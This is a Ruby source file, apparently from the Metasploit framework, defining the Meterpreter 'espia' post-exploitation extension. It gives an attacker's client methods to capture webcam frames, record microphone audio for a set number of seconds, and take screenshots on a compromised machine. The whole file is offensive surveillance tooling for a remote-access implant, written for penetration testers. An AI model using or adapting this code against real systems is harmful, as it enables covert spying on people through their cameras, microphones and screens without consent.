# frozen_string_literal: true
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/espia/tlv'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Espia
          ###
          #
          # This meterpreter extensions interface that is capable
          # grab webcam frame and recor mic audio
          #
          ###
          class Espia < Extension
            def initialize(client)
              super(client, 'espia')

              client.register_extension_aliases(
                [
                  {
                    'name' => 'espia',
                    'ext'  => self
                  }
                ]
              )
            end

            def espia_video_get_dev_image
              request = Packet.create_request('espia_video_get_dev_image')
              response = client.send_request(request)

              true
            end

            def espia_audio_get_dev_audio(rsecs)
              request = Packet.create_request('espia_audio_get_dev_audio')
              request.add_tlv(TLV_TYPE_DEV_RECTIME, rsecs)
              response = client.send_request(request)

              true
            end

            def espia_image_get_dev_screen
              request  = Packet.create_request('espia_image_get_dev_screen')
              response = client.send_request(request)
              return response.get_tlv_value(TLV_TYPE_DEV_SCREEN) if response.result == 0
              nil
            end
          end
        end; end; end; end; end
